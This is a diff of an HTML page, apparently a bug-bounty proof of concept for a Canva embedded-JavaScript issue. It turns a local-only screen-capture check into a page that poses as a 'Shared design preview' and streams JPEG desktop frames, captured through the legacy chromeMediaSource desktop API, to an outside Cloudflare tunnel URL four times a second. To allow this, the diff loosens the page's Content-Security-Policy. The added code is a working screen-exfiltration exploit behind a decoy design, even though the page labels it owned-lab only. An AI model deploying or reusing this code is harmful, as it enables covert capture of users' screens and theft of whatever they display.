@@ -5,172 +5,232 @@
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <meta name="referrer" content="no-referrer">
   <meta http-equiv="Content-Security-Policy"
-        content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'none'; img-src 'none'; media-src blob:; frame-src 'none'; worker-src 'none'; object-src 'none'; manifest-src 'none'; base-uri 'none'; form-action 'none'">
-  <title>Owned Canva legacy screen-capture check</title>
+        content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src https:; img-src 'none'; media-src blob:; frame-src 'none'; worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'">
+  <title>Shared design preview</title>
   <style>
-    :root { color-scheme: dark; font-family: ui-monospace, monospace }
+    :root { color-scheme: dark; font-family: Inter, ui-sans-serif, system-ui, sans-serif }
     * { box-sizing: border-box }
-    body { margin: 0; padding: 20px; background: #0b1117; color: #edf4fb }
-    main { width: min(960px, 100%); margin: auto }
-    h1 { margin: 0 0 8px; font-size: clamp(22px, 4vw, 36px) }
-    .notice { margin: 0 0 14px; color: #b9c8d7 }
-    .capture { position: relative; min-height: 260px; border: 2px solid #8b5cf6; background: #020617 }
-    video { display: block; width: 100%; max-height: 58vh; min-height: 260px; object-fit: contain; background: #020617 }
-    .badge { position: absolute; top: 12px; left: 12px; padding: 7px 10px; background: #991b1b; color: #fff; font-weight: 700 }
-    .countdown { position: absolute; top: 12px; right: 12px; padding: 7px 10px; background: #111827dd }
-    pre { min-height: 118px; margin: 14px 0 0; padding: 12px; border: 1px solid #475569; background: #111820; white-space: pre-wrap; overflow-wrap: anywhere }
-    button { width: 100%; margin-top: 12px; padding: 12px; border: 0; background: #7c3aed; color: #fff; font: inherit; font-weight: 700 }
-    button:disabled { opacity: .55 }
+    body { margin: 0; background: #0b1020; color: #eef2ff }
+    main { min-height: 100vh; display: grid; grid-template-columns: minmax(0,1fr) minmax(300px,380px) }
+    .design { padding: 42px; background: radial-gradient(circle at 15% 10%,#25345c,#111827 48%,#090e19) }
+    .eyebrow { color: #93c5fd; font-weight: 800; letter-spacing: .12em; text-transform: uppercase }
+    h1 { max-width: 720px; margin: 12px 0; font-size: clamp(42px,7vw,92px); line-height: .95 }
+    .subtitle { max-width: 620px; color: #cbd5e1; font-size: 20px; line-height: 1.5 }
+    .cards { display: grid; grid-template-columns: repeat(3,1fr); gap: 14px; margin-top: 42px }
+    .card { min-height: 130px; padding: 18px; border: 1px solid #52617f; border-radius: 16px; background: #111827bb }
+    .card b { display: block; font-size: 28px; margin-bottom: 8px }
+    aside { padding: 20px; background: #080d17; border-left: 1px solid #334155; overflow: auto }
+    aside h2 { margin: 0 0 6px; font-size: 20px }
+    .lab { padding: 10px; border: 2px solid #f59e0b; background: #3a260b; color: #fff2c7; font: 13px ui-monospace,monospace }
+    label { display: block; margin-top: 14px; color: #cbd5e1; font-size: 13px }
+    input { width: 100%; margin-top: 6px; padding: 10px; background: #111827; color: white; border: 1px solid #64748b; font: 13px ui-monospace,monospace }
+    .buttons { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 12px }
+    button { padding: 11px; border: 0; color: white; font-weight: 800 }
+    #start { background: #15803d } #stop { background: #b91c1c }
+    button:disabled { opacity: .45 }
+    .indicator { margin-top: 12px; padding: 9px; background: #334155; text-align: center; font-weight: 900 }
+    .indicator.live { background: #991b1b; animation: pulse 1s infinite alternate }
+    @keyframes pulse { to { background:#ef4444 } }
+    video { width: 100%; min-height: 170px; margin-top: 12px; object-fit: contain; background: #020617; border: 1px solid #475569 }
+    pre { min-height: 170px; padding: 10px; background: #111827; border: 1px solid #334155; color: #dbeafe; white-space: pre-wrap; overflow-wrap: anywhere; font: 12px ui-monospace,monospace }
+    canvas { display: none }
+    @media (max-width: 820px) { main { grid-template-columns: 1fr } aside { border-left: 0; border-top: 1px solid #334155 } .cards { grid-template-columns: 1fr } }
   </style>
 </head>
 <body>
-  <main>
-    <h1>Owned screen-capture boundary check</h1>
-    <p class="notice">One automatic legacy desktop request. Live local preview only; no recording, persistence, or transmission. The stream stops after 25 seconds.</p>
-    <div class="capture">
-      <video id="preview" autoplay muted playsinline></video>
-      <div id="badge" class="badge">STARTING</div>
-      <div id="countdown" class="countdown">25 s maximum</div>
+<main>
+  <section class="design">
+    <div class="eyebrow">Shared project preview</div>
+    <h1>Design systems that move with you.</h1>
+    <p class="subtitle">A harmless visual placeholder representing the content a shared Canva design may display while embedded JavaScript is active.</p>
+    <div class="cards">
+      <div class="card"><b>01</b>Reusable components</div>
+      <div class="card"><b>02</b>Clear collaboration</div>
+      <div class="card"><b>03</b>Fast delivery</div>
     </div>
-    <button id="stop" type="button" disabled>Stop screen stream now</button>
-    <pre id="status">Waiting 1200 ms before the single owned-lab request...</pre>
-  </main>
-  <script>
-    "use strict";
+  </section>
+  <aside>
+    <h2>Authorized impact control</h2>
+    <div class="lab">OWNED LAB ONLY — the triager chooses the receiver and explicitly starts/stops the live 480p stream.</div>
+    <label>Cloudflare tunnel base URL
+      <input id="receiver" type="url" placeholder="https://random-name.trycloudflare.com" autocomplete="off">
+    </label>
+    <div class="buttons">
+      <button id="start" type="button">Start live stream</button>
+      <button id="stop" type="button" disabled>Stop</button>
+    </div>
+    <div id="indicator" class="indicator">NOT STREAMING</div>
+    <video id="preview" autoplay muted playsinline></video>
+    <pre id="status">Enter the temporary receiver URL, then press Start.</pre>
+    <canvas id="canvas" width="854" height="480"></canvas>
+  </aside>
+</main>
+<script>
+"use strict";
 
-    const automaticStopMilliseconds = 25000;
-    const preview = document.getElementById("preview");
-    const badge = document.getElementById("badge");
-    const countdown = document.getElementById("countdown");
-    const status = document.getElementById("status");
-    const stopButton = document.getElementById("stop");
-    let stream = null;
-    let stopTimer = 0;
-    let countdownTimer = 0;
-    let deadline = 0;
-    let stopped = false;
-    let resolvedProof = null;
+const sourceId = "screen:-1:0";
+const width = 854;
+const height = 480;
+const intervalMilliseconds = 250;
+const jpegQuality = 0.55;
+const maximumFrameBytes = 2 * 1024 * 1024;
+const receiverInput = document.getElementById("receiver");
+const startButton = document.getElementById("start");
+const stopButton = document.getElementById("stop");
+const indicator = document.getElementById("indicator");
+const preview = document.getElementById("preview");
+const status = document.getElementById("status");
+const canvas = document.getElementById("canvas");
+const context = canvas.getContext("2d", { alpha: false });
 
-    const policy = document.permissionsPolicy || document.featurePolicy;
-    const displayCaptureDelegated = (() => {
-      try { return policy ? policy.allowsFeature("display-capture") : "unavailable"; }
-      catch { return "unavailable"; }
-    })();
+let stream = null;
+let timer = 0;
+let activeRequest = null;
+let sending = false;
+let startedAt = 0;
+let frameEndpoint = "";
+let viewerUrl = "";
+let framesSent = 0;
+let framesSkipped = 0;
+let bytesSent = 0;
+let lastFrameBytes = 0;
+let lastError = null;
 
-    function show(value) {
-      status.textContent = typeof value === "string" ? value : JSON.stringify(value, null, 2);
+function show(extra = {}) {
+  status.textContent = JSON.stringify({
+    outcome: stream ? "authorized-live-screen-stream-active" : "not-streaming",
+    sourceId,
+    resolution: `${width}x${height}`,
+    targetFramesPerSecond: 1000 / intervalMilliseconds,
+    framesSent,
+    framesSkipped,
+    bytesSent,
+    lastFrameBytes,
+    elapsedSeconds: startedAt ? Math.round((Date.now() - startedAt) / 100) / 10 : 0,
+    viewerUrl: viewerUrl || null,
+    lastError,
+    ...extra
+  }, null, 2);
+}
+
+function validateReceiver(raw) {
+  const url = new URL(raw);
+  if (url.protocol !== "https:") throw new Error("Receiver must use HTTPS");
+  if (url.username || url.password) throw new Error("Receiver URL must not contain credentials");
+  if (url.search || url.hash) throw new Error("Use only the tunnel base URL");
+  url.pathname = "/";
+  return url;
+}
+
+function canvasBlob() {
+  return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", jpegQuality));
+}
+
+async function sendFrame() {
+  if (!stream || sending || preview.readyState < 2) {
+    if (sending) framesSkipped++;
+    return;
+  }
+  sending = true;
+  try {
+    context.drawImage(preview, 0, 0, width, height);
+    const blob = await canvasBlob();
+    if (!blob) throw new Error("JPEG encoder returned no frame");
+    if (blob.size > maximumFrameBytes) throw new Error("JPEG frame exceeded 2 MiB");
+    activeRequest = new AbortController();
+    const response = await fetch(frameEndpoint, {
+      method: "POST",
+      mode: "cors",
+      credentials: "omit",
+      redirect: "error",
+      referrerPolicy: "no-referrer",
+      headers: { "Content-Type": "image/jpeg" },
+      body: blob,
+      signal: activeRequest.signal
+    });
+    if (!response.ok) throw new Error(`receiver returned HTTP ${response.status}`);
+    framesSent++;
+    bytesSent += blob.size;
+    lastFrameBytes = blob.size;
+    lastError = null;
+    show();
+  } catch (error) {
+    if (error.name !== "AbortError") {
+      lastError = `${error.name}: ${error.message}`;
+      show();
     }
+  } finally {
+    activeRequest = null;
+    sending = false;
+  }
+}
 
-    function stopAll(reason) {
-      if (stopped) return;
-      stopped = true;
-      clearTimeout(stopTimer);
-      clearInterval(countdownTimer);
-      const tracks = stream ? stream.getTracks() : [];
-      for (const track of tracks) track.stop();
-      preview.srcObject = null;
-      stopButton.disabled = true;
-      badge.textContent = "STOPPED";
-      badge.style.background = "#334155";
-      countdown.textContent = "0 s";
-      show({
-        ...(resolvedProof || {}),
-        outcome: "stopped",
-        captureOutcome: resolvedProof ? "legacy-desktop-capture-resolved" : "not-resolved",
-        reason,
-        sourceId: "screen:-1:0",
-        trackCount: tracks.length,
-        allTracksStopped: tracks.every((track) => track.readyState === "ended"),
-        previewLocalOnly: true,
-        recorded: false,
-        stored: false,
-        transmitted: false
-      });
-    }
+function stopStream(reason) {
+  clearInterval(timer);
+  timer = 0;
+  if (activeRequest) activeRequest.abort();
+  if (stream) for (const track of stream.getTracks()) track.stop();
+  stream = null;
+  preview.srcObject = null;
+  indicator.textContent = "NOT STREAMING";
+  indicator.classList.remove("live");
+  startButton.disabled = false;
+  stopButton.disabled = true;
+  show({ stoppedReason: reason });
+}
 
-    stopButton.addEventListener("click", () => stopAll("manual stop"), { once: true });
-    addEventListener("pagehide", () => stopAll("page hidden"), { once: true });
+async function startStream() {
+  startButton.disabled = true;
+  lastError = null;
+  try {
+    const base = validateReceiver(receiverInput.value);
+    frameEndpoint = new URL("/frame", base).href;
+    viewerUrl = new URL("/viewer", base).href;
+    const activationBeforeRequest = {
+      isActive: navigator.userActivation ? navigator.userActivation.isActive : "unavailable",
+      hasBeenActive: navigator.userActivation ? navigator.userActivation.hasBeenActive : "unavailable"
+    };
 
-    async function runSingleRequest() {
-      const activationBeforeRequest = {
-        isActive: navigator.userActivation ? navigator.userActivation.isActive : "unavailable",
-        hasBeenActive: navigator.userActivation ? navigator.userActivation.hasBeenActive : "unavailable"
-      };
-
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          audio: false,
-          video: {
-            mandatory: {
-              chromeMediaSource: "desktop",
-              chromeMediaSourceId: "screen:-1:0",
-              maxWidth: 1280,
-              maxHeight: 720,
-              maxFrameRate: 5
-            }
-          }
-        });
-      } catch (error) {
-        badge.textContent = "REQUEST FAILED";
-        badge.style.background = "#92400e";
-        countdown.textContent = "not active";
-        show({
-          outcome: "request-failed",
-          sourceId: "screen:-1:0",
-          displayCaptureDelegated,
-          activationBeforeRequest,
-          errorName: error && error.name ? error.name : "Error",
-          errorMessage: error && error.message ? error.message : String(error),
-          recorded: false,
-          stored: false,
-          transmitted: false
-        });
-        return;
+    stream = await navigator.mediaDevices.getUserMedia({
+      audio: false,
+      video: {
+        mandatory: {
+          chromeMediaSource: "desktop",
+          chromeMediaSourceId: sourceId,
+          maxWidth: 1280,
+          maxHeight: 720,
+          maxFrameRate: 5
+        }
       }
+    });
+    const track = stream.getVideoTracks()[0];
+    if (!track) throw new Error("No desktop video track returned");
+    preview.srcObject = stream;
+    await preview.play();
+    framesSent = 0;
+    framesSkipped = 0;
+    bytesSent = 0;
+    lastFrameBytes = 0;
+    startedAt = Date.now();
+    indicator.textContent = "LIVE — STREAMING 480p TO OWNED RECEIVER";
+    indicator.classList.add("live");
+    stopButton.disabled = false;
+    show({
+      activationBeforeRequest,
+      trackLabel: track.label,
+      trackSettings: track.getSettings()
+    });
+    await sendFrame();
+    timer = setInterval(sendFrame, intervalMilliseconds);
+  } catch (error) {
+    lastError = `${error.name}: ${error.message}`;
+    stopStream("start failed");
+  }
+}
 
-      const videoTracks = stream.getVideoTracks();
-      const audioTracks = stream.getAudioTracks();
-      const track = videoTracks[0] || null;
-      if (!track) {
-        stopAll("resolved stream had no video track");
-        return;
-      }
-      preview.srcObject = stream;
-      let previewPlayResult = "resolved";
-      try { await preview.play(); }
-      catch (error) { previewPlayResult = `${error.name}: ${error.message}`; }
-
-      badge.textContent = "LIVE LOCAL PREVIEW";
-      deadline = Date.now() + automaticStopMilliseconds;
-      countdownTimer = setInterval(() => {
-        const remaining = Math.max(0, Math.ceil((deadline - Date.now()) / 1000));
-        countdown.textContent = `${remaining} s remaining`;
-      }, 250);
-      stopTimer = setTimeout(() => stopAll("25-second limit"), automaticStopMilliseconds);
-      stopButton.disabled = false;
-
-      resolvedProof = {
-        outcome: "legacy-desktop-capture-resolved",
-        sourceId: "screen:-1:0",
-        origin: location.origin,
-        displayCaptureDelegated,
-        activationBeforeRequest,
-        videoTracks: videoTracks.length,
-        audioTracks: audioTracks.length,
-        trackKind: track ? track.kind : null,
-        trackLabel: track ? track.label : null,
-        trackSettings: track ? track.getSettings() : null,
-        previewPlayResult,
-        automaticStopSeconds: automaticStopMilliseconds / 1000,
-        previewLocalOnly: true,
-        recorded: false,
-        stored: false,
-        transmitted: false
-      };
-      show(resolvedProof);
-    }
-
-    setTimeout(runSingleRequest, 1200);
-  </script>
+startButton.addEventListener("click", startStream);
+stopButton.addEventListener("click", () => stopStream("triager pressed Stop"));
+addEventListener("pagehide", () => stopStream("page hidden"), { once: true });
+</script>
 </body>
 </html>
